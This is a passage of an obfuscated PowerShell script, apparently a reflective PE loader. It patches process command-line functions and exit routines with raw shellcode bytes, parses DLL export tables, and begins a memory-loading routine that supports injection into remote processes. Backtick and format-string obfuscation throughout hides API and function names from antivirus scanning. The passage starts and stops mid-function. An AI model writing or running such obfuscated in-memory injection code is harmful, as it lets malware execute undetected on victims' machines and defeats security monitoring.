		${pTRs`i`ZE} =   (chiLDiteM  ("V"+"AriA"+"Bl"+"E:GMQk") ).vALuE::"si`zEof"([Type][IntPtr])
		[UInt32]${OLDpr`Ot`eCTf`lAG} = 0

		[IntPtr]${KerN`el3`2h`An`dLE} = ${Win3`2F`UNCtiO`Ns}."gEt`m`oDULE`HaNdlE"."in`VO`ke"(("{1}{2}{0}" -f 'nel32.dll','K','er'))
		if (${kErNE`l32H`AN`DlE} -eq   ${u8m1`sf}::"Z`ERo")
		{
			throw ("{5}{4}{3}{1}{2}{0}" -f'll','n','u','l32 handle ','ne','Ker')
		}

		[IntPtr]${KeRn`elBa`SEH`And`Le} = ${win`32fU`N`CTIOns}."GETMODUL`eH`A`Ndle"."inVo`KE"(("{1}{2}{0}{3}{4}"-f'rnel','K','e','B','ase.dll'))
		if (${k`erNel`BAseHA`Nd`le} -eq  ${u8M1`sf}::"zE`RO")
		{
			throw ("{4}{1}{3}{0}{2}"-f'e nul','e h','l','andl','KernelBas')
		}

		
		
		
		${CM`dLI`N`E`wARGsptr} =   (  diR  variaBLe:gmQk ).vaLue::("{0}{1}{2}{3}"-f'Stri','ngT','o','HGlobalUni').Invoke(${EX`e`A`RGuMeN`TS})
		${CmDlIN`e`AarGS`pTr} =  ( gi ('VarIabL'+'e:GMQ'+'K')).VaLUe::("{3}{1}{4}{0}{2}"-f'lobalAns','ngTo','i','Stri','HG').Invoke(${e`XeAR`gU`menTS})

		[IntPtr]${Ge`Tc`OM`m`AnDLINEaA`ddR} = ${WI`N3`2`FUnCTIoNs}."G`ETpR`o`CADdrEsS"."I`NV`oKE"(${keRNe`L`BaS`eHandLe}, ("{2}{0}{1}{3}"-f'tCo','mm','Ge','andLineA'))
		[IntPtr]${GETcO`MMAnDl`IN`E`waddR} = ${Win3`2`FUncTI`o`Ns}."GetprOc`AdD`RE`Ss"."i`NVo`KE"(${keRNel`BaSEh`AN`DLe}, ("{1}{2}{3}{4}{0}"-f'W','GetC','ommand','Li','ne'))

		if (${gEtc`om`m`A`NdLiN`eaadDr} -eq   (variaBle  u8m1sF ).value::"Z`ErO" -or ${g`E`TcomMaNDLINe`wA`dDR} -eq   ${u8`m1`sF}::"Z`Ero")
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr) "
		}

		
		[Byte[]]${Sh`Ell`cODe1} = @()
		if (${ptRsi`Ze} -eq 8)
		{
			${sh`E`llcODE1} += 0x48	
		}
		${s`HeLlCo`D`E1} += 0xb8

		[Byte[]]${S`hE`LLCoD`E2} = @(0xc3)
		${ToT`Alsi`Ze} = ${ShELL`C`odE1}."l`EnGth" + ${ptrS`IZe} + ${ShelL`c`O`DE2}."lE`NgtH"


		
		${getCOMMa`N`D`LIN`EaO`R`IGBY`TeSpTr} =   (GEt-VaRiAbLe  gMqK  ).valUe::("{1}{2}{0}{3}" -f'ocHGl','A','ll','obal').Invoke(${TotAL`s`Ize})
		${geT`CommA`NdL`iN`EwORIgbyt`ESPtR} =  (  DIr vArIabLE:GMQK).VAlUE::("{2}{0}{1}" -f'lloc','HGlobal','A').Invoke(${t`oTAlSI`ze})
		${wIn`3`2fuNCTiO`NS}."mEm`CPY"."inV`o`Ke"(${G`eTcOmmanD`l`I`NeaoriGBYteSptR}, ${g`etc`oMMANd`LinE`AAD`dr}, [UInt64]${t`oTaLS`IzE}) | &("{0}{1}{2}" -f 'Out-','Nul','l')
		${Win32FU`N`CT`Ions}."MEm`Cpy"."INvo`Ke"(${G`e`TcOMmaN`Dli`N`e`woRIGbYtes`PtR}, ${g`EtC`OmmaNDl`ine`Wad`dr}, [UInt64]${tO`TaLSI`ZE}) | &("{0}{1}"-f 'Out-','Null')
		${R`ETuRN`A`RraY} += ,(${GE`TcommaN`Dli`NeaaDDR}, ${getC`O`MMa`NdL`i`NEaORigbYt`E`S`ptr}, ${t`o`Talsi`Ze})
		${ret`U`R`NaRRAY} += ,(${Ge`TCo`mMANd`lINeWAD`DR}, ${geT`COMMaNDLin`e`w`ORiGbYTEsPTR}, ${T`oTaLs`I`ze})

		
		[UInt32]${olDPrO`TECt`F`lAg} = 0
		${s`U`ccEsS} = ${wIn`32Funct`iO`Ns}."v`IRtUAL`pROTe`ct"."i`NVO`kE"(${G`etCom`M`A`NDLinEaA`d`dr}, [UInt32]${Tot`Al`Size}, [UInt32](${Win3`2CoN`stA`NTS}."PAgE_E`xe`cu`Te_rEADWRI`TE"), [Ref]${O`lDProt`EC`TflaG})
		if (${S`Ucc`ESs} = ${F`ALsE})
		{
			throw ("{5}{3}{7}{2}{6}{1}{0}{4}" -f 't ','Protec','u','r','failed','Call to Vi','al','t')
		}

		${G`EtCoMMANDl`IneAa`ddrt`EmP} = ${geT`CoM`MandLIn`EaAd`dr}
		&("{2}{4}{3}{0}{5}{1}" -f 'ToM','y','Write','Bytes','-','emor') -Bytes ${Sh`eLl`co`De1} -MemoryAddress ${g`ETCOMMa`N`D`LINEA`Ad`dRTeMp}
		${g`E`TCO`M`Man`DlInEaADdR`TeMP} = &("{3}{0}{2}{1}{4}"-f'd','ntAs','I','Add-Signe','Unsigned') ${GeTcoMM`An`dlI`NEaAddrte`mp} (${s`hel`l`codE1}."lEN`Gth")
		  ${G`MQK}::("{3}{4}{0}{1}{2}"-f'ctur','eToP','tr','S','tru').Invoke(${Cm`DLiN`EaArg`s`PTR}, ${GeTcommanD`Lin`eaAddRT`E`mP}, ${F`Al`sE})
		${GEt`COMm`ANdli`NEa`AddR`TEMp} = &("{2}{0}{1}{3}{4}"-f 'ignedI','nt','Add-S','AsUnsi','gned') ${g`eT`CO`mmANDli`N`EA`A`dDrTEmP} ${p`Tr`SIzE}
		&("{3}{0}{5}{4}{2}{1}"-f'rite','y','Memor','W','To','-Bytes') -Bytes ${Sh`eLl`CODe2} -MemoryAddress ${ge`T`ComM`AndlinEAAdd`RteMP}

		${Win32Fun`c`T`i`Ons}."V`Ir`T`UAlpROTe`ct"."I`N`VoKe"(${G`e`Tc`OmmAnD`LiN`EaAdDR}, [UInt32]${TOt`Als`iZE}, [UInt32]${OLDp`R`O`TEcT`FLAG}, [Ref]${Ol`d`ProTEcTflag}) | &("{1}{0}{2}" -f 'Nu','Out-','ll')


		
		[UInt32]${O`ldproT`EC`TFL`AG} = 0
		${SU`CCe`ss} = ${WIn32`F`U`NCTionS}."V`irtUAlP`R`o`TECT"."iNvO`KE"(${Get`cOMMA`NDLi`NEwAd`Dr}, [UInt32]${T`O`Talsi`ze}, [UInt32](${wiN`3`2cONSTaN`Ts}."P`AG`e_exEcUtE`_reaD`w`RI`Te"), [Ref]${OLD`Pr`oTEcTfl`AG})
		if (${Su`C`CeSs} = ${FAL`sE})
		{
			throw ("{2}{1}{4}{0}{3}"-f'Protect f','ll','Ca','ailed',' to Virtual')
		}

		${g`Et`cO`MMa`Nd`LiNEwAdd`RtEmP} = ${GETc`OMmAN`dlInE`WADdr}
		&("{0}{2}{1}{3}{4}{5}"-f'Write','sTo','-Byte','M','e','mory') -Bytes ${SHEL`L`C`ode1} -MemoryAddress ${getComMandl`I`NE`WAd`DRT`EmP}
		${GE`T`cOMmanD`li`NEw`Ad`dRTEMp} = &("{1}{0}{3}{2}{4}"-f 'gnedIn','Add-Si','Un','tAs','signed') ${GeTcomMa`NdLi`N`eWAdd`Rt`EMP} (${sHE`LL`cOde1}."L`E`NgtH")
		 ${gM`Qk}::("{0}{3}{2}{1}"-f'St','Ptr','ctureTo','ru').Invoke(${CMdLinEwaRG`s`PtR}, ${GeTCOmMa`N`dlInE`WAddrtE`MP}, ${FA`Lse})
		${GEtcoMm`AN`Dl`iNeWAD`dR`TEmP} = &("{2}{0}{7}{5}{6}{4}{3}{1}" -f'd','igned','A','ns','edIntAsU','Sig','n','d-') ${GET`cO`mMAndli`NeWad`Dr`TemP} ${p`TR`sIZE}
		&("{2}{0}{3}{4}{1}" -f'ite-B','y','Wr','ytesToM','emor') -Bytes ${S`hELL`cod`e2} -MemoryAddress ${GE`TcOmM`An`DliNeW`AdDrT`e`MP}

		${Wi`N32F`UNCt`io`Ns}."V`IrT`UAlPrO`TecT"."INVo`Ke"(${Getco`m`mAn`D`L`i`NEWAdDR}, [UInt32]${tO`Ta`L`sIze}, [UInt32]${o`L`DProt`eCT`FlaG}, [Ref]${oL`DPROt`EctFlag}) | &("{2}{0}{1}"-f '-Nu','ll','Out')
		


		
		
		
		
		
		${D`LllI`sT} = @(("{2}{0}{1}" -f 'cr70d','.dll','msv'), ("{1}{0}{2}" -f'r71d.dl','msvc','l'), ("{2}{1}{0}"-f'l','.dl','msvcr80d'), ("{1}{2}{0}{3}"-f'.d','msvc','r90d','ll'), ("{2}{1}{3}{0}"-f '.dll','svcr100','m','d'), ("{0}{2}{1}"-f 'msvcr110d.d','l','l'), ("{2}{1}{3}{0}" -f'0.dll','svc','m','r7') `
			, ("{0}{1}{2}" -f 'msv','cr','71.dll'), ("{1}{2}{0}"-f'.dll','msvc','r80'), ("{1}{0}{2}{3}"-f'.','msvcr90','d','ll'), ("{2}{3}{0}{1}"-f '0.d','ll','msvcr','10'), ("{3}{1}{0}{2}" -f'l','110.d','l','msvcr'))

		foreach (${d`ll} in ${dlll`iSt})
		{
			[IntPtr]${DL`LhAn`dLe} = ${wI`N`3`2`FUNcTIons}."GetMOd`UlEh`AND`le"."inv`OKe"(${D`ll})
			if (${D`L`lHandle} -ne   ( vARiAble u8M1sf ).valuE::"zE`Ro")
			{
				[IntPtr]${w`cmDLnA`D`Dr} = ${win`32`FuN`Ct`IONs}."G`eT`PRO`caddR`EsS"."INvO`Ke"(${Dll`HAN`dle}, ("{0}{1}"-f '_wcmdl','n'))
				[IntPtr]${a`CmD`LNAD`Dr} = ${WIn32fu`N`cTiO`Ns}."G`eT`Pr`OCADdRess"."i`Nv`Oke"(${Dll`h`A`NDlE}, ("{0}{1}{2}"-f '_a','cmd','ln'))
				if (${WCm`DLnA`ddR} -eq  ( gEt-ChILdItem ('va'+'R'+'IAb'+'lE:U8m1SF')  ).vaLUe::"z`Ero" -or ${A`C`Mdlnaddr} -eq  ( gET-vARIAble  ("U"+"8"+"M1sf")  -vAluEON )::"ZE`Ro")
				{
					((("{6}{3}{10}{9}{0}{4}{5}{2}{1}{7}{8}"-f ' ','cm','cmdln or _a','l','fi','nd _w','Error, cou','d','ln','jgt','dnf'))  -REPLaCe'fjg',[ChAR]39)
				}

				${newac`mD`LNPTr} =  ( DiR varIabLe:GMqk  ).vaLuE::("{0}{3}{2}{1}{4}" -f 'StringToH','alA','lob','G','nsi').Invoke(${exe`Ar`GUm`ENTs})
				${n`e`wwcmDL`NPTr} =  ( gci ('va'+'rI'+'ABLe:'+'gmQK')  ).vaLUe::("{4}{0}{2}{3}{1}"-f 'ngToH','ni','Global','U','Stri').Invoke(${e`xE`Ar`gU`mENTs})

				
				${OR`Iga`C`MdlnPtR} =   (  Gi ("vARiAbLE:"+"G"+"M"+"QK")  ).VAluE::"p`TR`TOSTrUc`Ture"(${aC`m`dlnaddr}, [Type][IntPtr])
				${o`R`i`gwC`MDlNpTr} =   (GET-ITeM  ('Va'+'ria'+'BlE:gMQk')  ).VALUe::"p`Trto`strUCT`U`RE"(${WC`mDLNa`ddR}, [Type][IntPtr])
				${ORI`gACmdlN`pt`RS`TOr`AgE} =   ( variABLe  ("GMQ"+"K")  -valuEOnLY  )::("{0}{1}{2}"-f 'A','llocHGlob','al').Invoke(${P`TrsiZe})
				${O`RIg`w`C`MdLnptrsTORage} =  ${G`MQk}::("{2}{1}{0}"-f'Global','locH','Al').Invoke(${ptR`s`izE})
				  ${g`mqk}::("{3}{1}{0}{2}"-f'ure','ct','ToPtr','Stru').Invoke(${oRI`g`A`cmDLnptr}, ${o`RIGAcMd`ln`pTrstO`R`A`GE}, ${FA`L`Se})
				 (  CHIlDIteM  variABLe:gMQK).vALUe::("{1}{0}{3}{2}" -f 'ruct','St','ToPtr','ure').Invoke(${o`RIGW`CMd`LNPtR}, ${ori`gwC`mDLnP`T`Rs`ToRAgE}, ${Fa`Lse})
				${rEtu`RnAr`RAY} += ,(${a`C`Mdln`AdDR}, ${o`RIgAC`MDln`P`TRsTor`AGe}, ${p`T`Rsize})
				${rE`TUrN`A`RRaY} += ,(${wC`MdLn`ADdR}, ${O`R`iGWcmdLnPTRstO`Ra`Ge}, ${PTR`S`iZe})

				${s`U`cceSs} = ${w`IN32fuN`Ctions}."vi`R`TU`AlpROTecT"."inV`o`kE"(${aCmd`Lna`d`DR}, [UInt32]${pt`Rs`Ize}, [UInt32](${W`I`N32COnSTAN`TS}."PagE`_`E`xEcUte_R`eA`DwRI`TE"), [Ref]${OLd`prot`ECtFlaG})
				if (${SU`cCeSS} = ${FaL`se})
				{
					throw ("{2}{6}{1}{5}{4}{3}{0}"-f't failed','t','Call','alProtec','Virtu','o ',' ')
				}
				  ( CHILDITem  ("vAr"+"IAbL"+"E:"+"GmQk") ).valuE::("{0}{4}{2}{3}{1}"-f 'S','r','ur','eToPt','truct').Invoke(${neW`A`CM`dLNPtR}, ${aC`MDlNA`D`dr}, ${f`A`LsE})
				${WI`N32fUNC`TI`oNS}."viRt`U`A`LpRoTEct"."iNV`oke"(${AC`MdL`NA`ddr}, [UInt32]${PTR`s`IZe}, [UInt32](${OLD`pR`o`TECtFlAG}), [Ref]${oLdpR`o`TEcTFL`Ag}) | &("{1}{2}{0}" -f'ull','O','ut-N')

				${S`UCCess} = ${WiN32FU`NCT`I`o`Ns}."vi`R`TuAlpR`oTeCt"."INv`OKe"(${w`c`MdLn`AdDR}, [UInt32]${p`Tr`sIZe}, [UInt32](${wI`N`32C`oNSTAnTs}."pAg`e_`EXECut`E_ReADWR`I`Te"), [Ref]${oL`D`P`R`oteCtfLag})
				if (${SUCC`eSS} = ${f`ALSe})
				{
					throw ("{5}{3}{8}{7}{4}{1}{0}{2}{6}" -f 'alP','u','rotect',' t','t','Call',' failed','Vir','o ')
				}
				 ${G`mqK}::("{4}{1}{2}{3}{0}"-f 'reToPtr','ru','c','tu','St').Invoke(${N`EWW`cmD`L`NPtr}, ${WC`Mdln`A`dDr}, ${Fa`lSe})
				${wi`N32`F`UnCTiOnS}."ViRtu`AL`pR`OtEcT"."InVO`KE"(${WCM`DLnad`DR}, [UInt32]${p`Trs`IZE}, [UInt32](${o`l`Dp`ROTECTflAG}), [Ref]${o`LDpro`TEC`Tfl`AG}) | &("{2}{1}{0}" -f 'Null','t-','Ou')
			}
		}
		


		
		

		${Retu`R`NaR`Ray} = @()
		${eX`itF`Un`C`TIONS} = @() 

		
		[IntPtr]${m`SCOr`EEh`And`Le} = ${w`In32FU`N`ctiO`NS}."GE`Tm`o`dUlE`haNDle"."I`Nv`OkE"(("{2}{0}{1}" -f'e','.dll','mscore'))
		if (${Ms`cOreEH`A`Nd`le} -eq   (vaRiaBLe  u8M1sf  -VALueOnly )::"z`ERO")
		{
			throw ("{4}{1}{0}{2}{3}"-f 'e','cor','e hand','le null','ms')
		}
		[IntPtr]${CoRexItpR`OCess`Ad`DR} = ${WIN`32F`UN`CtIOnS}."ge`TPR`OCAD`dr`ESs"."InV`OkE"(${msCOR`EeHAN`d`Le}, ("{4}{2}{1}{3}{0}"-f'ss','Pr','rExit','oce','Co'))
		if (${C`ORe`XitPrOc`Essa`dDr} -eq  (gi VariaBle:U8m1sf  ).vALUE::"ze`Ro")
		{
			Throw ("{4}{5}{3}{2}{0}{1}" -f't',' found',' no','cess address','CorExit','Pro')
		}
		${EX`iTFUncT`ioNS} += ${co`R`eXI`TpRoCEsSA`DdR}

		
		[IntPtr]${EXitp`Ro`Ce`s`SADdr} = ${wIn3`2`Fu`NcTions}."getpRoC`Add`R`eSs"."iNV`oKE"(${KErN`eL32`HaN`DlE}, ("{3}{2}{0}{1}" -f 'itP','rocess','x','E'))
		if (${e`x`iTpRoc`e`SsADDR} -eq  ${u8m1`sF}::"ZE`RO")
		{
			Throw ("{0}{5}{2}{4}{1}{3}"-f'ExitP','un','ss address n','d','ot fo','roce')
		}
		${EXItFUNc`Ti`O`NS} += ${e`xITPROcEs`sa`ddr}

		[UInt32]${O`Ldpr`oTec`TFl`AG} = 0
		foreach (${p`R`O`cEXI`TFU`NcT`IOnAddR} in ${EX`Itfu`NC`TIoNs})
		{
			${Pr`OceXi`TFu`N`CTi`oN`AddRt`mP} = ${p`RoCEXi`TFUnC`TIO`NadDr}
			
			
			[Byte[]]${sH`ELLc`O`dE1} = @(0xbb)
			[Byte[]]${ShEL`LCO`d`e2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			
			if (${P`TrSI`ZE} -eq 8)
			{
				[Byte[]]${sh`eLL`CoD`e1} = @(0x48, 0xbb)
				[Byte[]]${sh`E`LLCo`DE2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${S`HELl`CODE3} = @(0xff, 0xd3)
			${T`O`TAlsIzE} = ${S`HElL`cOdE1}."LENg`TH" + ${PT`Rs`IzE} + ${S`HElL`C`Ode2}."l`ENGTH" + ${pTrSI`zE} + ${S`h`ELLcoDe3}."lENG`TH"

			[IntPtr]${ExIT`TH`ReadaDDr} = ${wi`N32`FunctiONS}."GE`TPrO`c`A`DDreSS"."iN`VoKe"(${KE`R`Nel32HAND`le}, ("{2}{1}{0}" -f 'ad','re','ExitTh'))
			if (${exit`ThRE`A`d`AdDr} -eq   (vARIablE  ('u8M1'+'SF') -VA)::"ZE`Ro")
			{
				Throw ("{1}{4}{0}{2}{3}"-f' n','ExitTh','ot f','ound','read address')
			}

			${SUc`Ce`Ss} = ${WiN3`2Fu`NctI`oNs}."VIrT`UALprO`TE`Ct"."invO`ke"(${p`ROCeXItfUn`C`T`ioNA`dDR}, [UInt32]${TotAL`SI`zE}, [UInt32]${w`in`32CO`N`staNTs}."paGe`_executE_R`Ea`DW`RItE", [Ref]${OLDPr`OT`E`ctFLaG})
			if (${SUC`cE`SS} -eq ${F`AlSe})
			{
				Throw ("{2}{4}{5}{0}{1}{3}" -f 'irtualProtec','t faile','Call t','d','o ','V')
			}

			
			${EXitpR`OcES`sOr`IG`ByTEs`pTr} =  ${G`mqK}::("{2}{0}{1}" -f 'cHGlob','al','Allo').Invoke(${TOtA`Lsi`ZE})
			${wiN`32FUNc`T`iO`NS}."m`EM`cpy"."iNV`O`KE"(${E`xItpR`ocE`sSORIGb`YTE`sPTR}, ${PRo`ce`xItf`UncTiOnaDdR}, [UInt64]${tot`AlS`Ize}) | &("{0}{1}{2}" -f'O','ut-Nul','l')
			${r`eturnaR`RAY} += ,(${pR`ocExit`F`UNc`TIONaDdr}, ${EX`it`PRoCE`SsorIg`BYtEsptR}, ${TOtA`l`SiZE})

			
			
			&("{5}{0}{1}{4}{3}{2}" -f'rit','e-Bytes','emory','M','To','W') -Bytes ${sHELlC`oD`E1} -MemoryAddress ${PrOCExITf`UN`cTi`oNadD`RTmP}
			${PrOcexI`TfUncT`Io`N`A`dDr`TmP} = &("{1}{6}{3}{4}{2}{0}{5}" -f 'AsUnsigne','Ad','nedInt','i','g','d','d-S') ${pr`Oce`XI`TFun`CtIOnAdDRTmp} (${sheLL`C`O`de1}."Le`NgtH")
			 ( gEt-vArIAble gmqK -va  )::("{1}{3}{0}{4}{2}"-f'u','St','r','r','ctureToPt').Invoke(${EX`eDoN`EB`Y`TeptR}, ${pRocE`X`iTf`UNCtiONADDrt`mp}, ${Fa`L`se})
			${p`RO`CEXItF`UN`ct`ioNADDr`TmP} = &("{3}{1}{0}{4}{2}{7}{5}{6}"-f 'gnedIntA','d-Si','U','Ad','s','s','igned','n') ${prOcExItf`Un`cTi`onad`DRTMp} ${p`TrsIzE}
			&("{0}{1}{2}{3}" -f 'Write-','Bytes','ToMem','ory') -Bytes ${sHe`L`LCOD`e2} -MemoryAddress ${pROc`E`XITFu`NCTIonAd`drtMp}
			${pr`OCE`XItFu`Nction`Add`R`Tmp} = &("{2}{0}{1}{3}" -f'igne','dIntAsUnsi','Add-S','gned') ${pR`O`c`eXiTFunC`Tion`Add`RT`mp} (${S`hELLc`ode2}."Le`NgTh")
			  ( variabLE gMqK).VAlUE::("{1}{3}{0}{2}"-f't','StructureT','r','oP').Invoke(${EX`I`TT`hrE`AdAdDr}, ${P`RO`cExiTFuNcT`i`oNa`DDrtMP}, ${F`AlsE})
			${PrOC`ex`itf`UnC`T`IoNADDr`T`mp} = &("{1}{3}{0}{4}{2}"-f 'dIn','Add','ned','-Signe','tAsUnsig') ${pR`Oce`X`iTF`UNcti`o`NA`dDrTmp} ${P`TrS`izE}
			&("{3}{1}{4}{2}{0}"-f 'oMemory','B','tesT','Write-','y') -Bytes ${SHELl`cod`e3} -MemoryAddress ${p`ROCExITFunC`Tio`NA`DdRtMp}

			${WiN`32fUNcTI`ONs}."V`IR`T`Ua`LProTECT"."iNVO`ke"(${PrO`CE`Xit`FuNc`TIOn`AddR}, [UInt32]${To`TAlSi`Ze}, [UInt32]${O`LdPRo`TECTFL`Ag}, [Ref]${oLD`p`RoTe`ctFlaG}) | &("{0}{1}{2}"-f'Out-','N','ull')
		}
		

		&("{3}{0}{2}{1}"-f 'u','put','t','Write-O') ${rET`UrnAR`RAY}
	}


	
	
	Function C`OpY`-AR`RayOfMeMaddre`SseS
	{
		Param(
		[Parameter(poSItiON = 0, mAnDaTORy = ${tR`UE})]
		[Array[]]
		${CO`p`yINFo},

		[Parameter(poSItion = 1, MaNdaTORy = ${tr`UE})]
		[System.Object]
		${wIn32`FUN`ctiO`NS},

		[Parameter(PoSItIOn = 2, MaNDaTOry = ${Tr`Ue})]
		[System.Object]
		${WIn32CO`NsT`A`NTS}
		)

		[UInt32]${olDp`ROteCt`Fl`AG} = 0
		foreach (${I`NFo} in ${COP`yinFo})
		{
			${SUc`CesS} = ${wi`N`3`2FUncTIoNs}."vIrt`U`A`lp`RotEct"."IN`VoKE"(${I`Nfo}[0], [UInt32]${i`NfO}[2], [UInt32]${WiN`32`CoNst`A`Nts}."pAGe`_ExeCUTE_`Read`WR`i`Te", [Ref]${o`lD`PrOtE`CtfLAG})
			if (${sUC`C`ess} -eq ${F`A`lSE})
			{
				Throw ("{4}{0}{8}{3}{5}{1}{7}{2}{6}"-f't','Prote','ai','ua','Call ','l','led','ct f','o Virt')
			}

			${Wi`N`3`2fU`NcTIONs}."ME`Mc`PY"."i`N`VOkE"(${i`NfO}[0], ${I`NFO}[1], [UInt64]${iN`FO}[2]) | &("{0}{1}" -f 'Out-Nu','ll')

			${WiN32FUnct`io`NS}."Vi`R`TUa`LPROt`ect"."iNvo`Ke"(${i`NFo}[0], [UInt32]${In`Fo}[2], [UInt32]${O`l`DpRoTecTFLaG}, [Ref]${OldP`ROt`ECT`FLAG}) | &("{2}{1}{0}"-f'ull','ut-N','O')
		}
	}


	
	
	
	Function geT-m`emO`R`YPRoCA`dd`REss
	{
		Param(
		[Parameter(poSiTiON = 0, mANDAtorY = ${T`RUe})]
		[IntPtr]
		${Peha`Nd`lE},

		[Parameter(poSiTIoN = 1, MAndatory = ${T`RUe})]
		[String]
		${FuN`cTION`NAMe}
		)

		${Wi`N32`TYPes} = &("{1}{0}{2}"-f '2Type','Get-Win3','s')
		${WIN3`2COn`st`AntS} = &("{1}{2}{0}{3}"-f'nstan','Get-Win32C','o','ts')
		${Pei`NfO} = &("{4}{0}{2}{3}{5}{1}"-f'-PED','o','et','a','Get','iledInf') -PEHandle ${P`e`HA`NDLe} -Win32Types ${w`in3`2t`YPEs} -Win32Constants ${W`in32`CONS`TANTS}

		
		if (${P`ei`Nfo}."Im`AG`e_Nt_H`eA`dERS"."OPTio`NA`LhEAdeR"."EXp`ORTTA`BLE"."s`IZE" -eq 0)
		{
			return  (  Get-CHiLdItem  variAblE:U8m1Sf ).VALUE::"ZE`Ro"
		}
		${e`x`pORtta`BlEPtR} = &("{3}{2}{1}{5}{0}{4}"-f'tAsUnsigne','ne','d-Sig','Ad','d','dIn') (${PEHa`Nd`LE}) (${pE`INFO}."iM`AGe_`NT`_HeA`DErS"."OP`TI`oNA`LhEADeR"."EXP`or`TT`ABLE"."viRt`UAladDrE`Ss")
		${exP`OrTtAb`lE} =   (  Get-childitEM ('VAr'+'IaBlE'+':gMQK')  ).valUe::"pT`RtOs`Tru`ctU`RE"(${eXP`ORt`TAB`l`EptR}, [Type]${win32`T`Yp`es}."iMag`e_eX`p`ORT_dIRE`ct`OrY")

		for (${I} = 0; ${i} -lt ${EXpoR`T`TaBle}."N`UmbEr`OfnaM`eS"; ${i}++)
		{
			
			${N`AM`EofF`sETPtR} = &("{1}{0}{4}{3}{2}{5}"-f 'dd-S','A','dIntA','gne','i','sUnsigned') (${pEh`A`Ndle}) (${EXP`OR`Ttab`le}."ADdRE`S`soFnAMEs" + (${i} *   (  gEt-VaRiABlE  ('GM'+'qk')  ).VALUe::"S`IzEOf"([Type][UInt32])))
			${nAm`e`ptR} = &("{1}{4}{0}{3}{2}" -f'edIntAsU','Add-Sig','ned','nsig','n') (${pEH`AND`lE}) (  ( gEt-vARIABlE ('g'+'mQk') ).VaLuE::"PtrtOS`T`R`Uc`TuRE"(${nAMeOfF`sET`PTR}, [Type][UInt32]))
			${N`AmE} =  (ItEm  vARiABLe:gMQk  ).vAlUE::("{2}{3}{1}{0}" -f'nsi','ngA','P','trToStri').Invoke(${na`MEP`TR})

			if (${N`AmE} -ceq ${Fu`Nct`ionN`Ame})
			{
				
				
				${O`RDiNALp`Tr} = &("{4}{5}{2}{6}{7}{0}{1}{3}"-f 's','igne','ned','d','Add-Si','g','IntAsU','n') (${PehA`Ndle}) (${Exp`OR`Ttab`lE}."ADdrESSo`F`N`Am`Eord`InALS" + (${I} *  (  get-vArIabLE ('G'+'MqK')  ).VaLue::"size`Of"([Type][UInt16])))
				${F`UNci`N`dEx} =  ( VariaBlE ("g"+"MqK")  -value )::"pt`R`ToSt`RUctUrE"(${ORD`InAl`PTR}, [Type][UInt16])
				${funC`of`FSeTA`DDR} = &("{6}{1}{0}{3}{4}{2}{5}"-f 'gne','i','Unsigne','dI','ntAs','d','Add-S') (${p`ehaN`dlE}) (${eXpO`RT`TAb`LE}."ADDreS`SOffuNC`T`ions" + (${F`U`NCIndex} *  (  gEt-childiTeM VaRiAbLE:gmqK ).VAluE::"S`IzEoF"([Type][UInt32])))
				${f`U`Nc`oFfseT} =  ${GM`qk}::"ptR`To`ST`RuCTU`RE"(${FUNcoffs`E`Tad`dr}, [Type][UInt32])
				return &("{1}{3}{0}{4}{6}{5}{2}" -f 'e','Add','d','-Sign','dIntAs','gne','Unsi') (${p`EhaNd`Le}) (${f`UNcoFFS`Et})
			}
		}

		return   (  VAriaBle  u8M1SF  -VAlU )::"Ze`RO"
	}


	Function iN`Vo`kE-`mEmorYLO`AD`L`IBRARy
	{
		Param(
		[Parameter( poSitioN = 0, MANdatORY = ${tR`Ue} )]
		[Byte[]]
		${PEBy`T`eS},

		[Parameter(posiTion = 1, MaNdaTory = ${Fal`se})]
		[String]
		${EXEa`RGS},

		[Parameter(PoSiTION = 2, maNDAToRY = ${Fal`SE})]
		[IntPtr]
		${Re`mOTePr`O`cHanD`LE},

        [Parameter(POSitION = 3)]
        [Bool]
        ${f`o`Rce`ASlR} = ${fal`sE}
		)

		${PT`R`sIzE} =   (iTEm ("VarIabL"+"e"+":"+"gMqK") ).ValUE::"siz`EOF"([Type][IntPtr])

		
		${wIn`32C`O`NsTan`Ts} = &("{1}{4}{2}{3}{0}" -f 'nts','G','Win32Co','nsta','et-')
		${w`iN3`2FunCT`Io`NS} = &("{1}{3}{2}{0}"-f 'ctions','Get-Win','un','32F')
		${W`IN3`2`TYpes} = &("{3}{2}{1}{0}" -f'ypes','2T','3','Get-Win')

		${Re`Mo`TEL`oad`INg} = ${fa`lSe}
		if ((${R`E`M`OTEproChaNDLE} -ne ${nu`LL}) -and (${Re`M`o`TEpRO`CHANdLE} -ne   (  vArIabLE  ("U8m1"+"sF") ).VALue::"Z`ero"))
		{
			${reM`Ot`eLoa`DInG} = ${TR`UE}
		}

		
		&("{2}{1}{0}" -f 'bose','-Ver','Write') ("{1}{6}{3}{2}{8}{5}{4}{0}{7}"-f 'l','Ge','c PE','i',' from the fi','ion','tting bas','e',' informat')
		${Pe`i`Nfo} = &("{3}{0}{2}{1}" -f't-PEBas','o','icInf','Ge') -PEBytes ${pEby`TEs} -Win32Types ${wi`N`32`TYPES}
		${O`RiGi`NaL`ImagEbASE} = ${pEi`N`Fo}."OrIGIn`AlImAgE`B`ASe"
		${nxc`oM`P`ATiBlE} = ${Tr`Ue}
		if (([Int] ${PE`I`Nfo}."D`lLCHaRact`Er`IStIcs" -band ${w`In32`Consta`Nts}."i`MA`GE_DLlch`Ar`ACTe`RisTIcs_nx_`c`o`m`PAt") -ne ${WiN`32`ConSTAn`TS}."Ima`ge`_DLLchAr`A`cTEr`i`SticS_nx_com`PaT")
        {
			&("{1}{2}{3}{0}{4}"-f 'ar','Wr','ite','-W','ning') ("{7}{8}{4}{6}{0}{10}{9}{2}{3}{1}{5}"-f 'i','se is','t ca','u',' compa','sues','tible w','PE is n','ot','EP, migh','th D') -WarningAction ("{0}{1}"-f 'C','ontinue')
			${N`X`com`pATIbLE} = ${f`ALSe}
		}


		
		${PRoCE`Ss6`4b`IT} = ${tr`UE}
		if (${re`mOTelOAd`i`Ng} -eq ${Tr`UE})
		{
			${kERNEL32ha`N`D`lE} = ${WIn32F`Un`CtioNs}."geT`m`odulEHAN`dle"."INv`oKE"(("{0}{2}{1}" -f'kern','dll','el32.'))
